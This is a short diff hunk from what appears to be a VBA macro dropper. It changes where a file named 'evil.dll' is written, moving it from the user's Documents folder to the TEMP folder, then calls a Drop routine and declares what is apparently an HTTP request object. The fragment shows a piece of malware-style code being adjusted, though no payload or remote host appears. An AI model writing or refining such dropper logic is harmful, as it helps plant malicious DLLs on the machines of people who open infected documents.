@@ -57,7 +57,7 @@ Sub Run()
     Dim res As Long
 
 
-    path = Environ("USERPROFILE") & "\Documents\evil.dll"   
+    path = Environ("TEMP") & "\evil.dll"   
     Drop(path)
     Dim exists As String
     Dim hReq As Object
